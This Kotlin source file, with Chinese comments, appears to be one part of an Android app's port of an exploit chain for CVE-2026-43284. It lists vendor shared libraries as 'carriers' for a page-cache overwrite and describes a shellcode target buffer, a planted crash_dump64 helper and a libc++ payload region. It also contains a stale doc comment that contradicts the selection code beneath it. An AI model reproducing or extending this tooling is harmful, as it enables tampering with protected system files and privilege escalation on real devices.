package com.ghostlock.app.jni.cve43284

import java.io.File

/**
 *  载体候选表的一项。
 *
 *  @property path 载体的绝对路径（shellcode 的 ko_target 缓冲只有 64 字节，路径必须短于 64）。
 *  @property note 这一项的来历（ref 的行号 / 上游清单里的位置），只用于日志与代码对照。
 */
data class CarrierCandidate(
    val path: String,
    val note: String,
)

/**
 *  一次载体选择的结论。
 *
 *  @property index     选中的下标（0 起；当前实现恒为 0）。
 *  @property total     候选总数（含 profile 那一项）。
 *  @property candidate 选中的那一项。
 *  @property readable  选中项能否被本进程直读（判据见 [CarrierCandidates.isReadableAt]）。
 */
data class CarrierChoice(
    val index: Int,
    val total: Int,
    val candidate: CarrierCandidate,
    val readable: Boolean,
) {
    /** 选中项的路径（写路径 / ko_target 都用它，避免两处各写一份字面量）。 */
    val path: String get() = candidate.path

    /**
     *  一行选择日志：`carrier: <path> (candidate i/n, readable=<0|1>)`。
     *
     *  @return 供 `typed:` 通道打印的那一行（不带前缀，调用方自己加）。
     */
    fun line(): String =
        "carrier: " + path + " (candidate " + (index + 1) + "/" + total +
            ", readable=" + (if (readable) 1 else 0) + ")"
}

/**
 *  载体候选表与**唯一一处**选择逻辑。
 *
 *  # 参照
 *  - 生产用 profile 的 `carrier_path`，缺省才走候选集：
 *    ghostlock-app-ref@5f184760 的 `src/core/backend/cve_2026_43284/execution_binding.cpp:141-148`；
 *  - 候选集（顺序即上游 `DEFAULT_VENDOR_TARGETS`）：
 *    同 ref 的 `src/core/backend/cve_2026_43284/steps/chain.hpp:69-75` 的 `kDefaultCarriers`；
 *  - 只绑**一个**载体、绝不回退：同 ref 的 `backend_terminal.cpp:318-331`
 *    （页缓存写目标 / crash_dump 读桥 / libc++ shellcode 的 ko_target 必须是同一个文件）。
 *
 *  # 当前行为（不改变）
 *  仍然**只取第一项**：有 profile 路径就是它，否则 `/vendor/lib64/libbinderdebug.so`。
 *  ref 的"设备上第一个存在的候选"（`backend_terminal.cpp:138-163`）本端口还没接：
 *  这里只把 `readable` 标出来进日志，选择结果与从前一样。
 *
 *  # 直读判据
 *  `File.canRead()`（[isReadableAt]）：vendor 文件对 app/shell 域通常为 false，
 *  那时写路径必须逐块经 patch#1 写下的 crash_dump64 helper（ref pagecache.cpp:158-165）。
 *  判据做成参数是为了单测能注入，不为了在生产里换判据。
 */
object CarrierCandidates {
    /**
     *  载体不可直读时的**声明上界**（字节）。
     *
     *  ref 的 `target_size` 来自 `stat()`（execution_binding.cpp:184-188），读不到时是 0；
     *  0 会让闭包把每个区域都判成容量不足。这里用一个 32 MiB 的**上界**代替 0：
     *  它比本机任何 vendor .so / libc++ 都大，所以闭包仍然限定每个区域，而不会因为读不到就放行或全拒。
     *
     *  @note 合并计划**总是**用它，而不是载体 `stat()` 的真值：探针的载荷区 / 站点块落在 libc++ 上，
     *  而 vendor 载体通常不到 1 MiB；拿载体真值去量会把真计划判死（1 MiB < payload 0xfe628）。
     */
    const val DECLARED_SIZE_BYTES: Long = 32L * 1024L * 1024L

    /** 候选集本体：与 ref `kDefaultCarriers` 同序（上游 `DEFAULT_VENDOR_TARGETS`）。 */
    val DEFAULTS: List<CarrierCandidate> = listOf(
        CarrierCandidate(
            "/vendor/lib64/libbinderdebug.so",
            "上游 DEFAULT_VENDOR_TARGETS[0]（ref steps/chain.hpp:70-75）",
        ),
        CarrierCandidate(
            "/vendor/lib64/libstagefrighthw.so",
            "上游 DEFAULT_VENDOR_TARGETS[1]（ref steps/chain.hpp:70-75）",
        ),
        CarrierCandidate(
            "/vendor/lib64/libstagefright_aidl_bufferpool2.so",
            "上游 DEFAULT_VENDOR_TARGETS[2]（ref steps/chain.hpp:70-75）",
        ),
        CarrierCandidate(
            "/vendor/lib64/libbsp_module.so",
            "上游 DEFAULT_VENDOR_TARGETS[3]（ref steps/chain.hpp:70-75）",
        ),
    )

    /**
     *  有序候选表：profile 的 `carrier_path` 在前，随后是 [DEFAULTS]，同路径只留第一次出现。
     *
     *  @param profileCarrierPath profile 给的载体路径；null / 空白表示 profile 没指定。
     *  @return 至少一项的有序表（[DEFAULTS] 非空）。
     */
    fun ordered(profileCarrierPath: String? = null): List<CarrierCandidate> {
        val seen = HashSet<String>()
        val out = ArrayList<CarrierCandidate>(DEFAULTS.size + 1)
        if (!profileCarrierPath.isNullOrBlank() && seen.add(profileCarrierPath)) {
            out += CarrierCandidate(
                profileCarrierPath,
                "profile.carrier_path（ref execution_binding.cpp:141-148 优先）",
            )
        }
        for (candidate in DEFAULTS) {
            if (seen.add(candidate.path)) {
                out += candidate
            }
        }
        return out
    }

    /**
     *  直读判据：本进程能不能读它。
     *
     *  @param path 载体路径。
     *  @return `File.canRead()` 的结果（不存在 / 被 SELinux 拒读都是 false）。
     */
    fun isReadableAt(path: String): Boolean = File(path).canRead()

    /** 存在性判据：与 ref 的 file_fact 探测同义（探测被拒 ⇒ false ⇒ 退回第一项）。 */
    fun existsAt(path: String): Boolean = File(path).exists()

    /**
     *  选择载体：当前实现恒取第一项（行为不变），只把 `readable` 标出来。
     *
     *  @param profileCarrierPath profile 的载体路径；null 表示没指定。
     *  @param readable           直读判据（单测注入用；生产用 [isReadableAt]）。
     *  @return 选择结论；[CarrierChoice.index] 恒为 0。
     */
    /**
     * 选一个候选载体：**设备上第一个存在的**那个，全都不存在就退回第一项。
     *
     * 依据 ghostlock-app-ref@5f184760:backend/cve_2026_43284/backend_terminal.cpp:138-163：
     * 逐个 kDefaultCarriers 探测，命中即用；探测被拒时退回第一项，因为链在载体不可用时会 fail-closed。
     *
     * @param profileCarrierPath profile 指定的载体（优先）
     * @param readable 可读性判据（写进日志，不参与选择）
     * @param exists 存在性判据（选择用；默认真实文件系统）
     */
    fun select(
        profileCarrierPath: String? = null,
        readable: (String) -> Boolean = ::isReadableAt,
        exists: (String) -> Boolean = ::existsAt,
    ): CarrierChoice {
        val all = ordered(profileCarrierPath)
        for ((index, candidate) in all.withIndex()) {
            if (exists(candidate.path)) {
                return CarrierChoice(index = index, total = all.size, candidate = candidate, readable = readable(candidate.path))
            }
        }
        val first = all[0]
        return CarrierChoice(index = 0, total = all.size, candidate = first, readable = readable(first.path))
    }
}
